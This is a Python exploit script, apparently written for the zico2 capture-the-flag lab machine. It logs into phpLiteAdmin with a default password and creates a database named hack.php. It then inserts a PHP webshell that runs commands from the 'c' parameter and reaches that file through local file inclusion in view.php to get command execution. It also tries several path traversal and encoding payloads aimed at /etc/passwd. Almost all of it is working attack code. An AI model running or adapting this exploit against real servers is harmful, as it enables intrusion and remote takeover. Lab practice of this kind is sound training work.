#!/usr/bin/env python3
"""zico2 RCE - Correct SQL execution + webshell creation"""
import requests
import re

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'
PHPLITE = f'{BASE}/dbadmin/test_db.php'

# Login
print('[1] Login...')
s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})

# Execute SQL query correctly
print('[2] Execute SQL: SELECT * FROM info...')
r = s.post(f'{PHPLITE}?view=sql', data={
    'queryval': 'SELECT * FROM info',
    'delimiter': ';',
    'query': 'Go',
}, timeout=15)
print(f'  Status: {r.status_code} ({len(r.text)} bytes)')
if 'root' in r.text:
    print('  [+] Query works! Found data.')
    # Extract the results
    # Find table rows
    rows = re.findall(r'<td[^>]*>(.*?)</td>', r.text, re.DOTALL)
    clean_rows = [re.sub(r'<[^>]+>', '', r).strip() for r in rows]
    print(f'  Rows: {clean_rows}')

# Now the real exploit: 
# phpLiteAdmin v1.9.3 CVE: Create new database with .php extension
# Then insert PHP code as table content
# The database file IS the PHP file

# The database directory is /usr/databases/ - not web accessible
# But we can use LFI to include it!

print('\n[3] Creating hack.php database in /usr/databases/...')
r2 = s.post(PHPLITE, data={
    'new_dbname': 'hack.php',
}, timeout=15)
print(f'  Create: {r2.status_code}')

# Switch to hack.php database
r3 = s.get(PHPLITE, timeout=15)
if 'hack.php' in r3.text:
    print('  [+] hack.php database exists')
    # Click on hack.php link to switch
    link = re.search(r'href="(test_db\.php\?switchdb[^"]*)"[^>]*>.*?hack\.php', r3.text)
    if link:
        switch_url = f'{BASE}/dbadmin/{link.group(1)}'
        print(f'  Switch URL: {switch_url}')
        r4 = s.get(switch_url, timeout=15)
        print(f'  Switched: {r4.status_code}')
        
        # Create table with PHP payload
        print('\n[4] Creating table with PHP webshell...')
        r5 = s.post(f'{PHPLITE}?switchdb=hack.php&action=table_create', data={
            'tablename': 'x',
            'tablefields': '1',
            'f0name': 'a',
            'f0type': 'TEXT',
            'createtable': 'Go',
        }, timeout=15)
        print(f'  Create table: {r5.status_code}')
        
        # Insert PHP payload
        r6 = s.post(f'{PHPLITE}?switchdb=hack.php&action=row_create', data={
            'val0': '<?php system($_GET["c"]); ?>',
            'null_val0': 'NULL',
        }, timeout=15)
        print(f'  Insert: {r6.status_code}')
    else:
        # Try direct switch
        r4 = s.get(f'{PHPLITE}?switchdb=hack.php', timeout=15)
        print(f'  Direct switch: {r4.status_code}')
        
        # Check what databases are listed
        dbs = re.findall(r'switchdb=([^&"]+)', r4.text)
        print(f'  Available DBs: {dbs}')
else:
    print('  [-] hack.php not found in page')

# Now try LFI to include /usr/databases/hack.php
print('\n[5] LFI include /usr/databases/hack.php...')
lfi_payloads = [
    ('../../usr/databases/hack.php', True),
    ('../../../usr/databases/hack.php', True),
    ('/usr/databases/hack.php', True),
]
for payload, with_cmd in lfi_payloads:
    url = f'{BASE}/view.php?page={payload}'
    if with_cmd:
        url += '&c=id'
    r = s.get(url, timeout=10)
    clean = re.sub(r'<[^>]+>', '', r.text).strip()
    has_output = len(clean) > 0 and 'uid=' in clean
    print(f'  {payload}: {r.status_code} ({len(r.text)}B) uid={has_output}')
    if has_output:
        print(f'  [+] RCE SUCCESS: {clean[:200]}')
        break

# Also try: view.php might restrict directory traversal
# Let's check what characters are filtered
print('\n[6] Testing LFI filter rules...')
test_payloads = [
    ('../../../etc/passwd', 'Classic traversal'),
    ('....//....//....//etc/passwd', 'Double dot-slash'),
    ('/etc/passwd', 'Absolute path'),
    ('..%2f..%2f..%2fetc/passwd', 'URL encoded'),
    ('..%252f..%252f..%252fetc/passwd', 'Double URL encoded'),
]
for payload, desc in test_payloads:
    r = s.get(f'{BASE}/view.php?page={payload}', timeout=10)
    has_root = 'root:' in r.text
    has_hack = 'Hacking' in r.text or 'hack' in r.text.lower()
    status = 'OK' if has_root else ('BLOCKED' if has_hack else 'EMPTY')
    print(f'  {desc}: {status} ({len(r.text)}B)')
